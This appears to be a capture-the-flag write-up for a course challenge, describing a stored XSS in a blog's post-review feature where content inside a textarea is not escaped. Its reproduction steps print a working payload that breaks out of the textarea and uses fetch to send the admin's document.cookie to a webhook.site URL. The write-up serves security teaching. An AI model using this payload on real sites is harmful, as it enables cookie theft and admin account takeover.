# Challenge `Go on and censor my posts` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Stored Cross-Site Scripting (Stored XSS), HTML Injection via textarea context break-out.
- Where: Where is the vulnerability present
  - In the new blog post submission feature, more specific:
  ```js
  http://ssof2526.challenges.cwte.me:25253/posts_under_review/....
  ```
Vulnerability occurs when user-controlled post content is rendered inside a ```<textarea>``` without proper escaping.
- Impact: What results of exploiting this vulnerability
  - Execution of malicious JavaScript in the admin’s browser
  - Theft of admin cookies
  - Full admin account compromise

## Steps to reproduce

1. Create a new blog post with a random title and submit a random content.
2. Click Create Post to create a post which will lead to the posts_under_review.
3. Paste the following payload in the content box:
```sql
</textarea><script>fetch('https://webhook.site/67335a72-9738-4622-9218-2732119d2876',{
  method:'POST',body:document.cookie})</script><textarea>
```
4. Click Update post to send the post for admin review.
5. When the admin reviews the post, the injected script executes.
6. The admin’s cookies are sent to the webhook.